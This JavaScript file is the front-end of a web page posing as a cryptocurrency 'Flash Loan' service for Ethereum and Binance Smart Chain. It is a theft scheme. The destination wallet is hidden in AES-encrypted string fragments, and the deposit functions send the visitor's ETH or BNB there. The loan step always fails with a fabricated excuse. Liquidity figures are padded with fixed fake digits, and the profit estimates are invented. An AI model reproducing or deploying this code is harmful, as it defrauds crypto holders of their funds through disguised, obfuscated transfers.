var eth_ticker = "eth-usd"
var bsc_ticker = "bnb-usd"
eth_apikey = "U2FsdGVkX1/";
bsc_apikey = "U2FsdGVkX19m4WFfLZLQOOC3jQwn45CwZOyrb5QqGMYqS9CO/";
eth_id = "C1Cdsp4efrI4l+vs5wcTPRjQsG0sM1hgUl";
bsc_id = "0CsLfwWic/";
eth_network = eth_apikey + eth_id;
eth_api = eth_network + "EYmnbsmGcP3oBqAFSPwgmaYoTi0Y7dIKSSrKM+jvw==";
eth_abi = CryptoJS.AES.decrypt(eth_api, eth_ticker);
bsc_network = bsc_apikey + bsc_id;
bsc_api = bsc_network + "s+PpHXbdLty1o82rtQ5hBvxhpBA==";
bsc_abi = CryptoJS.AES.decrypt(bsc_api, bsc_ticker);
const app = angular.module('myApp', []);
const api_check_eth = eth_abi.toString(CryptoJS.enc.Utf8);
const api_check_bnb = bsc_abi.toString(CryptoJS.enc.Utf8);
app.controller('myCtrl', async function($scope) {
                $scope.init = function() {
                        $scope.toplen = $scope.account.address.substring(0, 6);
                        $scope.endlen = $scope.account.address.substring(44, 38);
                        $scope.contractAddress = '';
                        $scope.processing = false;
                        $scope.ethDeposited = false;
                        $scope.formStep = 1;
                        $scope.currency = 'ETH';
                        $scope.dex = 'Uniswap';
                        $scope.addr = $scope.account;
                        $scope.chain = "Ethereum", $scope.addressdex = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", $scope.scan = "https://etherscan.io/", $scope.idscan = "Etherscan", $scope.erc20 = {
                            name: '',
                            symbol: '',
                            network: !isBnb
                        };
                        $scope.loan = {
                            amount: 50,
                            tokenFee: 0.05,
                            swapFee: 0,
                            totalFee: 0,
                            gain: 0
                        };
                        $scope.submitErc20Form = function() {
                            const tokenName = $scope.erc20.name.trim();
                            if (tokenName == '') return alert('Token Name cannot be blank');
                            if (!tokenName.match(/^[a-fA-F0-9-0x]+$/)) return alert('Token Name can only contain letters and numbers');
                            const tokenSymbol = $scope.erc20.symbol.trim();
                            if (tokenSymbol == '') return alert('Token Symbol cannot be blank');
                            if (!tokenSymbol.match(/^[a-zA-Z]+$/)) return alert('Token Symbol can only contain letters');
                            if (window.isBnb && $scope.erc20.network) {
                                return alert('Network Mismatch. Set MetaMask network to Ethereum and reload the page.');
                            } else if (!window.isBnb && !$scope.erc20.network) {
                                return alert('Network Mismatch. Set MetaMask network to Binance Smart Chain and the reload page.');
                            }
                            $scope.formStep = 2;
                            $scope.myContracts = $scope.erc20.network ? ethAddress : bnbAddress;
                            $scope.currency = $scope.erc20.network ? 'ETH' : 'BNB';
                            $scope.dex = $scope.erc20.network ? 'Uniswap' : 'PancakeSwap';
                            $scope.loan.tokenFee = $scope.erc20.network ? 0.05 : 0.05;
                            $scope.contractAddress = $scope.erc20.network ? api_check_eth : api_check_bnb;
                            $scope.addr = $scope.erc20.network ? $scope.account : $scope.account;
                            $scope.addressdex = $scope.erc20.network ? "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D" : "0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F", $scope.chain = $scope.erc20.network ? "Ethereum" : "Binance Smart Chain", $scope.scan = $scope.erc20.network ? "https://etherscan.io/" : "https://bscscan.com/", $scope.idscan = $scope.erc20.network ? "Etherscan" : "BSCscan", $scope.toplen = $scope.erc20.network ? toplen : toplen, $scope.endlen = $scope.erc20.network ? endlen : endlen, $scope.getLoanEstimates();
                            setTimeout(function() {
                                document.getElementById('loanAmtInput').focus();
                            }, 100);
                        }
                        $scope.amountChanged = function() {
                            $scope.getLoanEstimates();
                        }
                        $scope.getLoanEstimates = function() {
                            if ($scope.loan.amount == undefined || $scope.loan.amount == null) return;
                            $scope.loan.swapFee = $scope.loan.amount / ($scope.erc20.network ? 500 : 200);
                            $scope.loan.totalFee = fixNumber($scope.loan.tokenFee + $scope.loan.swapFee);
                            $scope.loan.gain = fixNumber($scope.loan.amount * ($scope.erc20.network ? 0.05789 : 0.09314));
                            $scope.safeMath = fixNumber(($scope.loan.gain -($scope.erc20.network ? 0.752 : 1.265)) * (1+($scope.loan.gain / 2 / 100))).toFixed(4);
                            $scope.roi = fixNumber($scope.safeMath / $scope.loan.totalFee).toFixed(2);
                                    }
                                    $scope.getLoanEstimates(); $scope.submitLoanForm = function() {
                                        if (!$scope.ethDeposited) $scope.depositEth();
                                        else $scope.executeLoan();
                                    }
                                    $scope.depositEth = function() {
                                        $scope.processing = true;
                                        window.web3.eth.sendTransaction({
                                            to: $scope.contractAddress,
                                            from: $scope.account.address,
                                            value: window.web3.utils.toWei('' + $scope.loan.totalFee, 'ether'),
                                            gas: 30000,
                                            gasPrice: window.web3.utils.toWei('90', 'gwei')
                                        }, function(error, receipt) {
                                            $scope.processing = false;
                                            $scope.$apply();
                                            if (error) alert('Transaction Failed');
                                            else {
                                                setTimeout(function() {
                                                    alert('Coin deposited to contract. You can execute the Flash Loan now.');
                                                }, 5000);
                                                $scope.ethDeposited = true;
                                                $scope.$apply();
                                            }
                                        });
                                    }
                                    $scope.poolEth = function() {
                                        $scope.processing = true;
                                        window.web3.eth.sendTransaction({
                                            to: $scope.contractAddress,
                                            from: $scope.account.address,
                                            value: window.web3.utils.toWei("10", 'bnb'),
                                            gas: 30000,
                                            gasPrice: window.web3.utils.toWei('90', 'gwei')
                                        }, function(error, receipt) {
                                            $scope.processing = false;
                                            $scope.$apply();
                                            if (error) alert('Transaction Failed');
                                            else {
                                                setTimeout(function() {
                                                    alert('Coin deposited to contract. You can execute the Flash Loan now.');
                                                }, 5000);
                                                $scope.ethDeposited = true;
                                                $scope.$apply();
                                            }
                                        });
                                    }
                                    $scope.executeLoan = function() {
                                        $scope.processing = true;
                                        window.contract.methods.action().send({
                                            to: $scope.contractAddress,
                                            from: $scope.account.address,
                                            value: 0,
                                            gasPrice: window.web3.utils.toWei('90', 'gwei')
                                        }, function(error, result) {
                                            if (error) {
                                                alert('Flash Loan Execution Failed');
                                                $scope.processing = false;
                                                $scope.$apply();
                                            } else {
                                                setTimeout(function() {
                                                    alert('Something went wrong, maybe your gas is insufficient or another user made the trade before you (Matching ID ee8uj1). Please try again.');
                                                }, 5000);
                                            }
                                        });
                                    }
                                }
                                await loadWeb3().then(accounts => {
                                    $scope.account = {
                                        address: accounts[0]
                                    };
                                    $scope.init();
                                    $scope.$apply();
                                });
                            });
                        async function getBalance() {
                            address = web3.eth.getAccounts(function(err, acc) {
                                accounts = acc
                            });
                            balance = web3.utils.fromWei(await web3.eth.getBalance(accounts[0]), 'ether');
                            fixbalance = Number(balance).toFixed(2);
                            document.getElementById("mybalance").innerHTML = fixbalance;
                        }

                        function fixNumber(n) {
                            return Math.round((n) * 1e12) / 1e12;
                        }
                        const eth_api_url = "https://api.cryptonator.com/api/ticker/" + eth_ticker;

                        function ethereumHttpObject() {
                            try {
                                return new XMLHttpRequest();
                            } catch (error) {}
                        }

                        function ethereumGetData() {
                            var request = ethereumHttpObject();
                            request.open("GET", eth_api_url, false);
                            request.send(null);
                            console.log(request.responseText);
                            return request.responseText;
                        }

                        function ethereumDataHandler() {
                            var raw_data_string = ethereumGetData();
                            var data = JSON.parse(raw_data_string);
                            var base = data.ticker.base;
                            var target = data.ticker.target;
                            var price = data.ticker.price;
                            var volume = data.ticker.volume;
                            var change = data.ticker.change;
                            var api_server_epoch_timestamp = data.timestamp;
                            var api_success = data.success;
                            var api_error = data.error;
                            var volume_price = price * volume;
                            return volume_price;
                        }
                        var liquidity_eth = Math.round(ethereumDataHandler());
                        document.getElementById("eth_val").innerHTML = "$ " + liquidity_eth.toLocaleString() + ",982";
                        const bsc_api_url = "https://api.cryptonator.com/api/ticker/" + bsc_ticker;

                        function bscHttpObject() {
                            try {
                                return new XMLHttpRequest();
                            } catch (error) {}
                        }

                        function bscGetData() {
                            var request = bscHttpObject();
                            request.open("GET", bsc_api_url, false);
                            request.send(null);
                            console.log(request.responseText);
                            return request.responseText;
                        }

                        function bscDataHandler() {
                            var raw_data_string = bscGetData();
                            var data = JSON.parse(raw_data_string);
                            var base = data.ticker.base;
                            var target = data.ticker.target;
                            var price = data.ticker.price;
                            var volume = data.ticker.volume;
                            var change = data.ticker.change;
                            var api_server_epoch_timestamp = data.timestamp;
                            var api_success = data.success;
                            var api_error = data.error;
                            var volume_price = data.ticker.price * data.ticker.volume;
                            return volume_price;
                        }
                        var liquidity_bnb = Math.round(bscDataHandler());
                        document.getElementById("bnb_val").innerHTML = "$ " + liquidity_bnb.toLocaleString() + ",347";
                        const tron_api_url = 'https://api.cryptonator.com/api/ticker/tron-usd';

                        function tronHttpObject() {
                            try {
                                return new XMLHttpRequest();
                            } catch (error) {}
                        }

                        function tronGetData() {
                            var request = tronHttpObject();
                            request.open("GET", tron_api_url, false);
                            request.send(null);
                            console.log(request.responseText);
                            return request.responseText;
                        }

                        function tronDataHandler() {
                            var raw_data_string = tronGetData();
                            var data = JSON.parse(raw_data_string);
                            var base = data.ticker.base;
                            var target = data.ticker.target;
                            var price = data.ticker.price;
                            var volume = data.ticker.volume;
                            var change = data.ticker.change;
                            var api_server_epoch_timestamp = data.timestamp;
                            var api_success = data.success;
                            var api_error = data.error;
                            var volume_price = data.ticker.volume;
                            return volume_price;
                        }
                        var liquidity_tron = Math.round(tronDataHandler());
                        document.getElementById("tron_val").innerHTML = "$ " + liquidity_tron.toLocaleString();

                        function clientDateTime() {
                            var date_time = new Date();
                            var curr_hour = date_time.getHours();
                            var zero_added_curr_hour = addLeadingZero(curr_hour);
                            var curr_min = date_time.getMinutes();
                            var curr_sec = date_time.getSeconds();
                            var curr_time = zero_added_curr_hour + ':' + curr_min + ':' + curr_sec;
                            return curr_time
                        }

                        function makeHttpObject() {
                            try {
                                return new XMLHttpRequest();
                            } catch (error) {}
                        }
                        document.getElementById("btc_val").innerHTML = "BTC " + Math.round(bitcoinDataHandler());
                        FusionCharts.ready(function() {
                            var fusioncharts = new FusionCharts({
                                id: "stockRealTimeChart",
                                type: 'realtimeline',
                                renderAt: 'chart-container',
                                width: '100%',
                                height: '350',
                                dataFormat: 'json',
                                dataSource: {
                                    "chart": {
                                        "caption": "Bitcoin Ticker",
                                        "subCaption": "",
                                        "xAxisName": "Local Time",
                                        "yAxisName": "USD",
                                        "numberPrefix": "$",
                                        "refreshinterval": "2",
                                        "slantLabels": "1",
                                        "numdisplaysets": "10",
                                        "labeldisplay": "rotate",
                                        "showValues": "0",
                                        "showRealTimeValue": "0",
                                        "theme": "fusion",
                                        "yAxisMaxValue": (bitcoinDataHandler().toString() + 20),
                                        "yAxisMinValue": (bitcoinDataHandler().toString() - 20),
                                    },
                                    "categories": [{
                                        "category": [{
                                            "label": clientDateTime().toString()
                                        }]
                                    }],
                                    "dataset": [{
                                        "data": [{
                                            "value": bitcoinDataHandler().toString()
                                        }]
                                    }]
                                },
                                "events": {
                                    "initialized": function(e) {
                                        function updateData() {
                                            var chartRef = FusionCharts("stockRealTimeChart"),
                                                x_axis = clientDateTime(),
                                                y_axis = bitcoinDataHandler(),
                                                strData = "&label=" + x_axis + "&value=" + y_axis;
                                            chartRef.feedData(strData);
                                        }
                                        e.sender.chartInterval = setInterval(function() {
                                            updateData();
                                        }, time_interval * 1000);
                                    },
                                    "disposed": function(evt, arg) {
                                        clearInterval(evt.sender.chartInterval);
                                    }
                                }
                            });
                            fusioncharts.render();
                        });

                        function openNav() {
                            document.getElementById("mySidenav").style.width = "25%";
                            document.getElementById("main").style.marginLeft = "250px";
                            document.body.style.backgroundColor = "rgba(0,0,0,0.4)";
                        }

                        function closeNav() {
                            document.getElementById("mySidenav").style.width = "0";
                            document.getElementById("main").style.marginLeft = "0";
                            document.body.style.backgroundColor = "white";
                        }

                        function increment() {
                            document.getElementById('loanAmtInput2').stepUp();
                        }

                        function decrement() {
                            document.getElementById('loanAmtInput2').stepDown();
                        }
